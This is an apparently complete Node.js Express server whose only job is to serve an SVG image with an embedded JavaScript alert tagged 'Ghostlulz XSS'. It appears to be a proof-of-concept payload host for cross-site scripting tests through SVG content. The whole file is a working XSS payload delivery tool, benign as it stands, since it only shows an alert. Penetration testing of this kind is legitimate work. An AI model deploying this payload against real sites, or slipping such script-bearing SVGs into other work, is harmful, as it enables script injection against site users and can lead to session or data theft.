const express = require('express')
const app = express()
app.all('/', (req, res) => {
    console.log("Just got a request!")

    res.setHeader('Content-Type', 'image/svg+xml');
    data=`<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("Ghostlulz XSS");
   </script>
</svg>`
    res.send(data)
})
app.listen(process.env.PORT || 3000)
